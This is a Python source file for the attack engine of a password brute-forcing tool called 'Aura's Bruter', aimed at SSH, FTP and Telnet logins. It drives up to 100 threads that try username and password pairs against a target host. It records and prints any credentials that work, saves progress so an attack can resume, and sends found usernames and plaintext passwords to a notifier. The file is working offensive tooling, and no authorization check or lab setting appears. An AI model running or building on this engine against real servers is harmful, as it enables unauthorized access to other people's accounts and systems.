#!/usr/bin/env python3
"""
Aura's Bruter - Attack Engine
Core engine that orchestrates attacks with multi-threading
"""

import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional, Iterator, Tuple, List, Dict, Any
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from queue import Queue

from rich.console import Console
from rich.progress import Progress, TaskID, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout


@dataclass
class AttackStats:
    """Real-time attack statistics."""
    total: int = 0
    tested: int = 0
    successful: int = 0
    failed: int = 0
    errors: int = 0
    start_time: float = 0.0
    found_credentials: List[Dict[str, str]] = field(default_factory=list)
    current_user: str = ""
    current_pass: str = ""
    
    @property
    def elapsed(self) -> float:
        """Elapsed time in seconds."""
        if self.start_time == 0:
            return 0
        return time.time() - self.start_time
    
    @property
    def speed(self) -> float:
        """Attempts per second."""
        if self.elapsed == 0:
            return 0
        return self.tested / self.elapsed
    
    @property
    def progress_percent(self) -> float:
        """Progress percentage."""
        if self.total == 0:
            return 0
        return (self.tested / self.total) * 100
    
    @property
    def eta_seconds(self) -> float:
        """Estimated time remaining in seconds."""
        if self.speed == 0:
            return 0
        remaining = self.total - self.tested
        return remaining / self.speed
    
    def format_elapsed(self) -> str:
        """Format elapsed time as human readable."""
        return str(timedelta(seconds=int(self.elapsed)))
    
    def format_eta(self) -> str:
        """Format ETA as human readable."""
        if self.eta_seconds == 0:
            return "Unknown"
        return str(timedelta(seconds=int(self.eta_seconds)))


class AttackEngine:
    """
    Core attack engine with multi-threading support.
    
    Features:
    - Configurable thread pool
    - Real-time progress tracking
    - Graceful stop/pause
    - Callback support for UI updates
    """
    
    def __init__(
        self,
        attacker,  # Protocol attacker (SSH, FTP, Telnet)
        rate_limiter=None,
        session_manager=None,
        notifier=None,
        threads: int = 10,
        on_progress: Callable = None,
        on_found: Callable = None,
        on_complete: Callable = None
    ):
        """
        Initialize attack engine.
        
        Args:
            attacker: Protocol-specific attacker instance
            rate_limiter: RateLimiter for delays
            session_manager: SessionManager for save/resume
            notifier: Notifier for alerts
            threads: Number of concurrent threads
            on_progress: Callback for progress updates
            on_found: Callback when credential is found
            on_complete: Callback when attack completes
        """
        self.attacker = attacker
        self.rate_limiter = rate_limiter
        self.session_manager = session_manager
        self.notifier = notifier
        self.threads = max(1, min(threads, 100))
        
        # Callbacks
        self.on_progress = on_progress
        self.on_found = on_found
        self.on_complete = on_complete
        
        # State
        self.stats = AttackStats()
        self._running = False
        self._paused = False
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        
        # Console
        self.console = Console()
    
    def start(
        self,
        credential_generator: Iterator[Tuple[str, str, int, int]],
        total_combinations: int
    ):
        """
        Start the attack.
        
        Args:
            credential_generator: Iterator yielding (user, pass, user_idx, pass_idx)
            total_combinations: Total number of combinations
        """
        self.stats = AttackStats(
            total=total_combinations,
            start_time=time.time()
        )
        self._running = True
        self._stop_event.clear()
        
        # Notify attack started
        if self.notifier and self.notifier.is_configured():
            try:
                self.notifier.send_attack_started(
                    host=self.attacker.host,
                    port=self.attacker.port,
                    protocol=self._get_protocol_name(),
                    mode="brute-force",
                    total_combinations=total_combinations
                )
            except Exception:
                pass
        
        # Run with progress display
        self._run_with_progress(credential_generator)
    
    def _get_protocol_name(self) -> str:
        """Get the protocol name from the attacker class."""
        class_name = self.attacker.__class__.__name__.lower()
        if "ssh" in class_name:
            return "SSH"
        elif "ftp" in class_name:
            return "FTP"
        elif "telnet" in class_name:
            return "Telnet"
        return "Unknown"
    
    def _run_with_progress(self, credential_generator):
        """Run attack with Rich progress display."""
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40),
            TextColumn("[progress.percentage]{task.percentage:>3.1f}%"),
            TextColumn("•"),
            TextColumn("[cyan]{task.fields[speed]}/s"),
            TextColumn("•"),
            TextColumn("[yellow]Found: {task.fields[found]}"),
            TimeElapsedColumn(),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=self.console,
            refresh_per_second=4
        ) as progress:
            
            task = progress.add_task(
                f"[cyan]Attacking {self.attacker.host}:{self.attacker.port}",
                total=self.stats.total,
                speed="0",
                found="0"
            )
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {}
                credentials_batch = []
                batch_size = self.threads * 2
                
                try:
                    for cred in credential_generator:
                        if self._stop_event.is_set():
                            break
                        
                        while self._paused and not self._stop_event.is_set():
                            time.sleep(0.1)
                        
                        credentials_batch.append(cred)
                        
                        if len(credentials_batch) >= batch_size:
                            self._process_batch(executor, futures, credentials_batch, progress, task)
                            credentials_batch = []
                    
                    # Process remaining
                    if credentials_batch and not self._stop_event.is_set():
                        self._process_batch(executor, futures, credentials_batch, progress, task)
                    
                    # Wait for all futures
                    for future in as_completed(futures):
                        if self._stop_event.is_set():
                            break
                        try:
                            future.result()
                        except Exception:
                            pass
                
                except KeyboardInterrupt:
                    self.stop()
                    self.console.print("\n[yellow]Attack interrupted by user[/yellow]")
                
                finally:
                    self._running = False
        
        # Show final results
        self._show_results()
        
        # Notify completion
        if self.notifier and self.notifier.is_configured():
            try:
                self.notifier.send_attack_completed(
                    host=self.attacker.host,
                    port=self.attacker.port,
                    protocol=self._get_protocol_name(),
                    tested=self.stats.tested,
                    found=self.stats.successful,
                    duration=self.stats.format_elapsed()
                )
            except Exception:
                pass
        
        # Call completion callback
        if self.on_complete:
            self.on_complete(self.stats)
    
    def _process_batch(self, executor, futures, credentials_batch, progress, task):
        """Process a batch of credentials."""
        for user, passwd, u_idx, p_idx in credentials_batch:
            if self._stop_event.is_set():
                break
            
            future = executor.submit(self._try_credential, user, passwd, u_idx, p_idx)
            futures[future] = (user, passwd)
        
        # Process completed futures
        done_futures = [f for f in futures if f.done()]
        for future in done_futures:
            try:
                result = future.result()
                with self._lock:
                    self.stats.tested += 1
                    
                    if result and result.success:
                        self.stats.successful += 1
                        self.stats.found_credentials.append({
                            "username": result.username,
                            "password": result.password,
                            "found_at": datetime.now().isoformat()
                        })
                        
                        # Notify
                        if self.notifier and self.notifier.is_configured():
                            self.notifier.send_credential_found(
                                host=self.attacker.host,
                                port=self.attacker.port,
                                protocol=self._get_protocol_name(),
                                username=result.username,
                                password=result.password
                            )
                        
                        # Session update
                        if self.session_manager:
                            self.session_manager.add_credential(result.username, result.password)
                        
                        # Callback
                        if self.on_found:
                            self.on_found(result)
                    else:
                        self.stats.failed += 1
                    
                    # Update session
                    if self.session_manager:
                        self.session_manager.update_progress(tested=self.stats.tested)
                
                # Update progress
                progress.update(
                    task,
                    completed=self.stats.tested,
                    speed=f"{self.stats.speed:.1f}",
                    found=str(self.stats.successful)
                )
                
            except Exception as e:
                with self._lock:
                    self.stats.errors += 1
            
            del futures[future]
    
    def _try_credential(self, username: str, password: str, u_idx: int, p_idx: int):
        """Try a single credential."""
        with self._lock:
            self.stats.current_user = username
            self.stats.current_pass = password
        
        # Apply rate limiting
        if self.rate_limiter and self.rate_limiter.enabled:
            self.rate_limiter.wait()
        
        # Try the credential
        result = self.attacker.try_credentials(username, password)
        
        # Update rate limiter
        if self.rate_limiter:
            if result.success:
                self.rate_limiter.record_success()
            elif result.error and "timeout" in result.error.lower():
                self.rate_limiter.record_connection_error()
            else:
                self.rate_limiter.record_failure()
        
        return result
    
    def stop(self):
        """Stop the attack."""
        self._stop_event.set()
        self._running = False
        
        if self.session_manager:
            self.session_manager.pause()
    
    def pause(self):
        """Pause the attack."""
        self._paused = True
    
    def resume(self):
        """Resume the attack."""
        self._paused = False
    
    def is_running(self) -> bool:
        """Check if attack is running."""
        return self._running
    
    def get_status(self) -> dict:
        """Get current attack status for API/bot."""
        return {
            "target": f"{self.attacker.host}:{self.attacker.port}",
            "progress": self.stats.progress_percent,
            "tested": self.stats.tested,
            "found": self.stats.successful,
            "speed": self.stats.speed,
            "elapsed": self.stats.format_elapsed(),
            "eta": self.stats.format_eta(),
            "running": self._running,
            "paused": self._paused
        }
    
    def get_results(self) -> list:
        """Get found credentials."""
        return self.stats.found_credentials
    
    def _show_results(self):
        """Display final attack results."""
        self.console.print()
        
        # Summary table
        table = Table(title="[bold]Attack Summary[/bold]", show_header=False, border_style="cyan")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        table.add_row("Target", f"{self.attacker.host}:{self.attacker.port}")
        table.add_row("Protocol", self._get_protocol_name())
        table.add_row("Total Tested", f"{self.stats.tested:,}")
        table.add_row("Successful", f"[green]{self.stats.successful}[/green]")
        table.add_row("Failed", f"{self.stats.failed:,}")
        table.add_row("Errors", f"[red]{self.stats.errors}[/red]")
        table.add_row("Duration", self.stats.format_elapsed())
        table.add_row("Avg Speed", f"{self.stats.speed:.1f}/sec")
        
        self.console.print(table)
        
        # Found credentials
        if self.stats.found_credentials:
            self.console.print()
            cred_table = Table(title="[bold green]🔓 Found Credentials[/bold green]", border_style="green")
            cred_table.add_column("Username", style="cyan")
            cred_table.add_column("Password", style="yellow")
            cred_table.add_column("Found At", style="dim")
            
            for cred in self.stats.found_credentials:
                cred_table.add_row(
                    cred["username"],
                    cred["password"],
                    cred.get("found_at", "")
                )
            
            self.console.print(cred_table)
        else:
            self.console.print("\n[dim]No credentials found.[/dim]")


if __name__ == "__main__":
    console = Console()
    console.print("[yellow]Attack Engine Module[/yellow]")
    console.print("[dim]This module orchestrates brute force attacks with multi-threading.[/dim]")
